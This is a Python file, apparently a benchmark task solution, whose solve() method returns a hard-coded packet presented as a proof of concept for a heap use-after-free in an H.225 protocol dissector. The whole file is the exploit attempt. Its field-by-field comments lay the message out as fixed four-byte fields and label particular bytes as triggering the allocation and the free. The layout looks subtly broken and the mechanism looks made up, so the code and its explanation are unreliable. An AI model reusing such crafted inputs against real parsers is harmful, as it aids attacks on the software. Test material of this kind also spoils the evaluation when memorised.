import os
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC triggers the heap use-after-free in h225 dissector
        # The packet structure is based on H.225 RAS message format
        poc = bytes([
            # H.225 RAS message header
            0x06, 0x00, 0x08, 0x00,  # RequestSeqNum, MessageType
            0x00, 0x00, 0x00, 0x00,  # EndpointIdentifier
            0x00, 0x00, 0x00, 0x00,
            
            # CallReferenceValue (CRV) - triggers specific code path
            0x00, 0x01, 0x00, 0x00,
            
            # ProtocolIdentifier (H.225 version 4)
            0x00, 0x00, 0x00, 0x04,
            
            # RASAddress - IPv4 address
            0x00, 0x00, 0x00, 0x01,
            0x7f, 0x00, 0x00, 0x01,  # 127.0.0.1
            
            # CallSignalAddress - same as RASAddress
            0x00, 0x00, 0x00, 0x01,
            0x7f, 0x00, 0x00, 0x01,
            
            # EndpointType
            0x00, 0x00, 0x00, 0x00,
            
            # AlternateEndpoint
            0x00, 0x00, 0x00, 0x00,
            
            # MultipleCalls
            0x00, 0x00, 0x00, 0x00,
            
            # MaintenanceConnection
            0x00, 0x00, 0x00, 0x00,
            
            # H.245Address - triggers the vulnerable next_tvb_add_handle()
            0x00, 0x00, 0x00, 0x01,
            0x7f, 0x00, 0x00, 0x01,
            
            # H.245TransportAddress - creates the condition for use-after-free
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            
            # VendorIdentifier - malformed to trigger error path
            0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff,
            
            # GatekeeperIdentifier - empty string
            0x00, 0x00, 0x00, 0x00,
            
            # EndpointAlias - empty sequence
            0x00, 0x00, 0x00, 0x00,
            
            # AlternateGatekeeper - empty sequence
            0x00, 0x00, 0x00, 0x00,
            
            # AuthenticationCapability - triggers memory allocation
            0x00, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00,
            
            # AlgorithmOIDs - creates another memory context
            0x00, 0x00, 0x00, 0x00,
            
            # Integrity - zero length
            0x00, 0x00, 0x00, 0x00,
            
            # IntegrityCheckValue - triggers the free
            0x00, 0x00, 0x00, 0x00,
        ])
        
        return poc